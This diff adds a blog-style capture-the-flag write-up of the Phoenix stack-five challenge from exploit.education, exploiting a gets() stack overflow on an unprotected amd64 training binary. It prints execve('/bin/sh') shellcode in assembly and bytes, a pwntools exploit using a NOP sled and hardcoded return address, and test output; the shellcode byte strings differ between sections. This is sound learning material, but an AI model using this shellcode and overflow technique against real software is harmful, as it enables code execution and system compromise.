@@ -1,0 +1,275 @@
+---
+title: phoenix stack 5 - stack buffer overflow
+description: a brief write-up (and exploit) on why you should read the ***** manual
+image: rsc/imgs/pixel.jpg
+author: execius
+date: 2025-07-12
+tags: [binary exploitation]
+---
+
+- # phoenix stack-five write up
+## prologue
+- so this is one of the challenges i spent the most time with , i had forgotten many things during the university year : assembly programming , pwn library , gdb and r2 for god's sake , but this is also the challenge i learned most from , all of the things above and more i have relearned and more , in this write up i will provide some insights about what i did and what i learned.
+
+## what will i do?
+- in this challenge I am working with a an amd64 little indian architecture on linux , there is also no protections on the binary and the aslr is disabled on the machine(address space layout randomization)
+- i began by reading the infamous article Phrack 48:14 , which is named same as this write up "smashing the stack for fun and profit" , here is a link :https://phrack.org/issues/49/14#article
+- I also watched the video by liveoverflow in the series named binary exploitation , same titre .
+- I will not go into how the stack works as it is already explained in the file [[The stack and calling conventions in x86]] 
+- same for [[x86_64 assembly]] and [[virtual memory]]
+
+
+## analysis of the binary 
+- so first we run the file in the terminal , it seems to get input from the user :
+```bash
+user@phoenix-amd64:/tmp/test$ ./stack-five
+Welcome to phoenix/stack-five, brought to you by https://exploit.education
+sdlfkjsdklfj
+user@phoenix-amd64:/tmp/test$
+```
+- after checking the c code in the site of exploit education it seems like that's exactly what the program does:
+
+```c
+/*
+ * phoenix/stack-five, by https://exploit.education
+ *
+ * Can you execve("/bin/sh", ...) ?
+ *
+ * What is green and goes to summer camp? A brussel scout.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+void start_level() {
+  char buffer[128];
+  gets(buffer);
+}
+
+int main(int argc, char **argv) {
+  printf("%s\n", BANNER);
+  start_level();
+}
+```
+
+- we can see that the program declares an array of size 128 and takes input into it using the function **gets** which is insecure as it doesn't do any bounds checking and can take input bigger than the size of the array (see the man page), this is called an overflow and it is the base of our attack. 
+- Now , our goal is to spawn a shell ,we know that the program has no function that does that so we got to make the binary execute our own code , but first , we gotta make that code that's gonna spawn us a shell , that is called a shell code , and if we can make it and place into the stack , then make the rip pointer point to it , the processor will run it without  question because the stack in this case is executable , although in there days these are protection that make the stack non-executable , this is not true in our case and the world is so damn beautiful .
+
+# making the shellcode
+- so how we're gonna make the code you say ? just fire up vim and write some x86 assembly  , and make a program that spawns a shell by executing "/bin/sh" , this step has taken me hours as i have forgot most about x86 assembly , however I did it and here is the code : 
+```nasm
+sub rsp , 0x28
+mov rax, 0x68732f6e69622f
+mov QWORD [rsp],rax 
+lea rdi,[rsp] 
+xor rsi, rsi
+xor rdx, rdx
+push 59
+pop rax
+syscall 
+push 16
+pop rax
+syscall
+
+```
+- explanation of these instructions:
+	1. we make space for the string "/bin/sh" by substracting 40 from the stack , just a random number that i'm sure can hold the string 
+		```nasm
+		sub rsp , 0x28
+		``` 
+
+	2. second we move the value 0x68732f6e9622f into rax , that value is the ascii representation of the string "/bin/sh"  , but reversed , because of the [[endianness]] of the system (little endian) 
+		```nasm
+		mov rax, 0x68732f6e69622f
+		``` 
+	3. third we move the string form rax into the stack  
+
+		```nasm
+		mov QWORD [rsp],rax 
+		``` 
+	 now before i continue , we are gonna make a syscall to execve , that is a function in the unix interface that executed elf programs , the first argument is the string of the path to the binary , which is passed in rdi , th second is an array of the arguments given to that binary which in this case is not needed so we will pass NULL to it (equivalent with all zeros) , and the third is envp which has to do with the environment of the program and is passed in rdx but we can pass NULL to this as well and it will work . now we continue
+
+	4. fourth we are moving the address of the string to rdi 
+ 
+		```nasm
+		lea rdi,[rsp] 
+		``` 
+	5. fifth we are xoring rsi with itself which basically sets it to NULL (all zeros)
+		```nasm
+		xor rsi, rsi
+		```
+	6. we do the same to rdx and now our arguments are ready and we just need to perform the syscall and let the os do it's wizardry .
+		```nasm
+		xor rdx, rdx
+		```
+	7.  we set rax to 59 (which is the number of the execve syscall) , we do that by pushing 59 into the stack and then poping it to rax .
+		```nasm
+		push 59	
+		pop rax
+		```
+	8. finally we perform the syscall and there you go 
+		```nasm
+		syscall 
+		```
+- we are done and if you have the same architecture you can check if this works by assembling and liking it:
+```bash  
+	$ nasm -f elf64 -o shellcode.o assemblyfile
+	$ ld -o shellcode shellcode.o 
+	$ ./shellcode
+	```
+- then a shell will spawn , use the exit command to quit it as it is useless right now
+
+- so now we have some assembly code , but it looks nothing like something we're gonna put into the stack of a program , so we are going to make a shellcode out of it , which is basically the machine code representation of that assembly , you can that manually by checking the opcode of each instruction but we hackers are lazy , we I'm just gonna dump the crap outta the binary using **objdump** I just created above(that spawns a shell) and then i will copy the bytes :
+```bash
+	$ objdump -d shellcode
+	
+shellcode:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 <__bss_start-0x1000>:
+  401000:       48 83 ec 28             sub    $0x28,%rsp
+  401004:       48 b8 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rax
+  40100b:       73 68 00
+  40100e:       48 89 04 24             mov    %rax,(%rsp)
+  401012:       48 8d 3c 24             lea    (%rsp),%rdi
+  401016:       48 31 f6                xor    %rsi,%rsi
+  401019:       48 31 d2                xor    %rdx,%rdx
+  40101c:       6a 3b                   push   $0x3b
+  40101e:       58                      pop    %rax
+  40101f:       0f 05                   syscall
+  401021:       6a 10                   push   $0x10
+  401023:       58                      pop    %rax
+  401024:       0f 05                   syscall 	
+``` 
+- in the middle section you can see some random numbers , that is our assembly but in the machine language , after copying and some sanitizing , it looks like this :
+```bash
+\x48\x83\xec\x28\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x89\x04\x24\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x10\x58\x0f\x05
+
+```
+- now this is ready to go into the stack , but how we are going to execute it ? in a hacker's words , how were're gonna make the rip pointer point to it ? I've got you neighbor .
+
+## making the exploit
+
+- now we know that the [[Stack frame]] of the start level function will look like this :
+```text
++---------------------------+  <-- Higher memory address
+|  Return Address           |  (Saved by the `call` instruction)
++---------------------------+
+|  Saved Base Pointer (RBP) |  (Old RBP of the caller function)
++---------------------------+
+|  128-byte Buffer          |  (Local buffer in the stack frame)
+|  [---------------------]  |
+|  [        128 B        ]  |
+|  [---------------------]  |
++---------------------------+  <-- Lower memory address (Stack grows downward)
+```
+
+- since the gets makes no bounds checks , we can overwrite the values that are after the buffer chunk , and there is our **ret** , the address that the function will return to when its execution is complete , as we will be writing upwards with our input , we can **overwrite  the ret address** , and make it point to the stack , where our code is happily waiting to be executed, now that we cracked this in theory  , it's time to craft our exploit .
+
+- I use python and the pwn library to do this :
+```python
+from pwn import *
+context.arch      = 'amd64'
+context.os        = 'linux'
+context.endian    = 'little'
+context.word_size = 64
+shellcode =b"\x48\x83\xec\x27\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x89\x04\x24\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05"
+stacksize=144
+padding= stacksize -len(shellcode)-8
+payload = b'\x90'*padding+shellcode+p64(0x00007fffffffe610)
+p = process("./stack-five")
+p.send(payload)
+p.interactive()
+
+```
+
+now lets explain this :
+- as you can see , in the begging i import the library and the tell it what my architecture is by defining the context struct , all of this is generic , then we got our shell code defined(as binary data , that is necessary as the cpu only knows binary) and the stack size.
+- the padding is how much we're gonna fill the stack before introducing our shell code and our ret address substitution , fill it with what you say ? a nop slide .
+
+
+- nop is and operation that does nothing , just passes the ball to the instruction after it , if we fill the stack with it before our code , if the instruction pointer happens to point to any of those nops (which are longer than our shellcode and ret substitution) , it will **slide** right to our shell code in a series of nops , that where the name comes from , this is very useful in the in the case where we dont know the exact offset of the stack , as if  we cover a large area with nops , the chances of our code getting executed get **way higher**  as no matter where rip happens to point in that line of nops , the will always lead it right to our code . 
+
+- the -8 in the padding makes space for the value we'll replace ret with .
+- our code is in the stack , so we gotta replace ret with the address of the stack (rsp) , to get it we will use gdb:
+```nasm
+$ gdb stack five
+gdb bla bla bla
+
+(gdb) b start_level
+Breakpoint 1 at 0x400591
+(gdb) run
+Breakpoint 1, 0x0000000000400591 in start_level ()
+(gdb) info r
+(gdb) info r
+rax            0x0                 0x0
+rbx            0x7fffffffe688      0x7fffffffe688
+rcx            0x7ffff7db6d07      0x7ffff7db6d07
+rdx            0x0                 0x0
+rsi            0x7fffffffe560      0x7fffffffe560
+rdi            0x4b                0x4b
+rbp            0x7fffffffe610      0x7fffffffe610
+rsp            0x7fffffffe610      0x7fffffffe610
+r8             0x7ffff7ffb300      0x7ffff7ffb300
+r9             0x7fffffffe5ef      0x7fffffffe5ef
+r10            0x1                 0x1
+r11            0x206               0x206
+r12            0x7fffffffe698      0x7fffffffe698
+r13            0x4005a4            0x4005a4
+```
+- as we can see the rsp in this function's stack frame is 0x7fffffffe610 so we're gonna overwrite ret with that.
+
+- there comes our payload we just fill the padding with the opcode of nop instruction which is $0x90$ then we put our shell code then we pack the address of the stack with p64 that makes it binary so the cpu can read it.
+- after that we open a process with the process function in pwnlib, and then we send the payload as input to it , that should give us a shell.
+- p.interactive let's us interact with the shell when it spawns
+
+
+## testing our exploit
+
+
+```shell
+ $ python ./smashingthestackforfunandprofit.py
+ 
+[x] Starting local process './stack-five'
+[+] Starting local process './stack-five': pid 1048
+[*] Switching to interactive mode
+Welcome to phoenix/stack-five, brought to you by https://exploit.education
+ls
+ls
+assembly.s  payload  shellcode  smashingthestackforfunandprofit.py  stack-five
+cat assembly.s
+execute:
+sub $0x27, %rsp
+    movabs $0x68732f6e69622f, %rax
+    movq %rax, (%rsp)
+    leaq (%rsp), %rdi
+    xorq %rsi, %rsi
+    xorq %rdx, %rdx
+    pushq $59
+    popq %rax
+    syscall
+    pushq $16
+    popq %rax
+    syscall
+
+```
+
+## tips and pitfalls 
+- if your shell code doesn't work , use the int3 instruction  to make a SIGTRAP which is a fancy word for break point , for example put this in the beginning of your shell code to check if it executes , if it does the program will stop and report a sigtrap , if it doesn't then there is a problem in the ret address you overwrote the old one with, which in our case is the stack pointer , and that brings us to a pitfall i wanna talk about.
+
+- i did a mistake and it drove me nuts , i was ssh-ing into the VM and using gdb to determine the stack pointer in the target function and i used that in my exploit and when I ran the exploit in the VM directly it wouldn't work , but it worked in my machine , I took me a while to think of rechecking the stack address using gdb in the VM itself since i didn't suspect ssh-ing into it would make any change , then i found that the address was different from my ssh session , turns out it has something to do with the environment variables with are put in the memory layout of the program before the stack , and thus they affect its offset , changing the address by few bytes , but that was enough to make my exploit break because i was using an address lower than the whole stack, now i could used an address that is bigger than the stack and the nop slide would have fixed that anyway , why didn't i do it ? because I am an idiot.
+
+
+# epilogue
+  **and voila ,stack smashed , profit (and a lot of dumb mistakes) made, way too much coffee sipped ,wizardry done , shell spawned from an innocent program, I hope that I was helpful , stay crafty , stay curious and see you space cowboys**
+
+
